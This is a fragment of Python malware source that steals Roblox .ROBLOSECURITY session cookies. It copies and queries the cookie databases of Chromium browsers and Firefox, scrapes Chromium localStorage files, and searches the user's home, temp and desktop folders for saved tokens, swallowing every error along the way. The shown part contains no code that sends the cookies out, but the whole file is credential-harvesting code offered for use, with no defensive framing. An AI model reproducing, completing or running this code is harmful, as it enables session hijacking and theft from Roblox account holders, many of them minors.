# ---------- Helper: extract cookie from any text ----------
def extract_cookie(text):
    # Look for .ROBLOSECURITY=value pattern
    import re
    match = re.search(r'\.ROBLOSECURITY[=:][A-Za-z0-9_\-\.]+', text)
    if match:
        return match.group().split('=',1)[1] if '=' in match.group() else match.group().split(':',1)[1]
    return None

# ---------- Method 1: Chromium browsers (Chrome, Edge, Brave, etc.) ----------
def chromium_cookies():
    cookies = []
    browsers = {
        'Chrome': os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Cookies'),
        'Edge': os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Cookies'),
        'Brave': os.path.expandvars(r'%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Cookies'),
        'Opera': os.path.expandvars(r'%APPDATA%\Opera Software\Opera Stable\Cookies'),
        'Vivaldi': os.path.expandvars(r'%LOCALAPPDATA%\Vivaldi\User Data\Default\Cookies'),
        'Chromium': os.path.expandvars(r'%LOCALAPPDATA%\Chromium\User Data\Default\Cookies')
    }
    cookie_names = ['.ROBLOSECURITY', 'ROBLOSECURITY', '_ROBLOSECURITY']
    for name, path in browsers.items():
        if not os.path.isfile(path):
            continue
        temp = os.environ['TEMP'] + f'\\{name}_cookies.db'
        try:
            shutil.copy2(path, temp)
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            for cname in cookie_names:
                try:
                    cur.execute("SELECT value FROM cookies WHERE name = ?", (cname,))
                    for row in cur.fetchall():
                        val = row[0]
                        if val and len(val) > 30:
                            cookies.append(val)
                except:
                    pass
            conn.close()
            os.remove(temp)
        except:
            try: os.remove(temp)
            except: pass
    return cookies

# ---------- Method 2: Firefox (SQLite) ----------
def firefox_cookies():
    cookies = []
    profiles = os.path.expandvars(r'%APPDATA%\Mozilla\Firefox\Profiles')
    if not os.path.isdir(profiles):
        return cookies
    for profile in os.listdir(profiles):
        if profile.endswith('.default-release') or profile.endswith('.default'):
            cookie_db = os.path.join(profiles, profile, 'cookies.sqlite')
            if not os.path.isfile(cookie_db):
                continue
            temp = os.environ['TEMP'] + '\\ff_cookies.db'
            try:
                shutil.copy2(cookie_db, temp)
                conn = sqlite3.connect(temp)
                cur = conn.cursor()
                cur.execute("SELECT value FROM moz_cookies WHERE name = '.ROBLOSECURITY'")
                for row in cur.fetchall():
                    if row[0]:
                        cookies.append(row[0])
                conn.close()
                os.remove(temp)
            except:
                try: os.remove(temp)
                except: pass
    return cookies

# ---------- Method 3: Browser localStorage (Chromium) ----------
def browser_localstorage_cookies():
    cookies = []
    localStorage_paths = [
        os.path.expandvars(r'%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb'),
        os.path.expandvars(r'%LOCALAPPDATA%\Microsoft\Edge\User Data\Default\Local Storage\leveldb')
    ]
    for path in localStorage_paths:
        if not os.path.isdir(path):
            continue
        for f in os.listdir(path):
            if f.endswith(('.log', '.ldb')):
                try:
                    with open(os.path.join(path, f), 'r', errors='ignore') as fp:
                        content = fp.read()
                        cookie = extract_cookie(content)
                        if cookie:
                            cookies.append(cookie)
                except:
                    pass
    return cookies

# ---------- Method 4: Common text files (user might have saved cookie) ----------
def common_files_cookies():
    cookies = []
    search_dirs = [os.environ['USERPROFILE'], os.environ['TEMP'], os.environ['DESKTOP']]
    for d in search_dirs:
        if not d: continue
        for ext in ['*.txt', '*.log', '*.cfg', '*.ini', '*.json']:
            for f in glob.glob(os.path.join(d, ext)):
                try:
                    with open(f, 'r', errors='ignore') as fp:
                        content = fp.read()
                        cookie = extract_cookie(content)
                        if cookie:
                            cookies.append(cookie)
                except:
                    pass
    return cookies

